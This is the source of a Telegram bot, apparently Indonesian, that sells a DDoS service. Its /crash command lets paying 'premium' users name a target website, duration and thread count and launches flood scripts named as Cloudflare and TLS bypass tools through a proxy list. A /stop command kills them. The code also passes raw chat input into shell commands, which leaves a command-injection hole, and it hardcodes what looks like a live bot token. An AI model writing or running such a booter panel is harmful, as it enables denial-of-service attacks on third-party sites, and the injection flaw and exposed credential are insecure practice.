const TelegramBot = require('node-telegram-bot-api');
const request = require('request');
const axios = require('axios');
const { Telegraf } = require('telegraf');
const { Markup } = require('telegraf');
const express = require('express');
const fs = require('fs');
const { exec } = require('child_process');
const token = '7128562694:AAGM2bI2emHYHlJkwQrqqFRf87cFxRItTMY';
const bot = new TelegramBot(token, {polling: true});
const adminId = '6976608110'; // ID admin, ganti dengan 
const premiumUserDB = './premiumUsers.json';

exec('node menu2.js', (err, stdout, stderr) => {
  if (err) {
    console.error(err);
    return;
  }
  console.log(stdout);
});


// Mendapatkan informasi bot
// Code untuk menjalankan BK.js
console.log('OWNER ./GHOSTX-MODS');

// Menampilkan menu bot 
bot.onText(/\/admin/, (msg) => {
  const chatId = msg.chat.id; 
  bot.sendMessage(chatId, "👨🏻‍💻 Click the button below to contact admin",
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'ADMIN', url: 'https://t.me/kangNoKosWa' }
          ]
        ]
      },
      parse_mode: "Markdown"
    }
  );
});
//menu stop
bot.onText(/\/stop/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (isPremiumUser(userId)) {
    // Hentikan file yang sedang berjalan
    exec("pkill -f CFbypass.js");
    exec("pkill -f TLS-BYPASS.js");
    exec("pkill -f UAM.js");
    exec("pkill -f holddd.js");
   
    bot.sendMessage(chatId, 'Berhasil menghentikan file yang sedang berjalan.');
  } else {
    bot.sendMessage(chatId, 'Maaf, hanya pengguna premium yang dapat menggunakan perintah ini.');
  }
});
//menu crash
try {
  const data = fs.readFileSync('premiumUsers.json', 'utf8');
  const premiumUsers = new Set(JSON.parse(data)); // Baca data premiumUsers dari file JSON

  //menu crash
bot.onText(/\/crash (.+) (.+) (.+) (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (isPremiumUser(userId)) {
    const web = match[1];
    const time = match[2];
    const req = match[3];
    const thread = match[4];

      // Menjalankan script Crash1.js dengan parameter yang diberikan
      exec(`node CFbypass.js ${web} ${time}`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time},\nReq: ${req},\nThread: ${thread}`);
      });

      // Menjalankan script Crash3.js dengan parameter yang diberikan
      exec(`node holddd.js ${web} ${time} 25 5 proxy.txt`, (error, stdout, stderr) => {
        if (error) {
          bot.sendMessage(chatId, `Error: ${error.message}`);
          return;
        }
        if (stderr) {
          bot.sendMessage(chatId, `Error: ${stderr}`);
          return;
        }
        bot.sendMessage(chatId, `Success\n\nTarget: ${web},\nTime: ${time},\nReq: 25,\nThread: 5`);
      });
    } else {
      bot.sendMessage(chatId, 'Maaf, hanya pengguna premium yang dapat menggunakan perintah ini.');
    }
  });

  function isPremiumUser(userId) {
    // Cek apakah userId ada di dalam premiumUsers
    return premiumUsers.has(userId.toString());
  }

  // Jalankan bot
  bot.startPolling();
} catch (error) {
  console.error('Error:', error);
}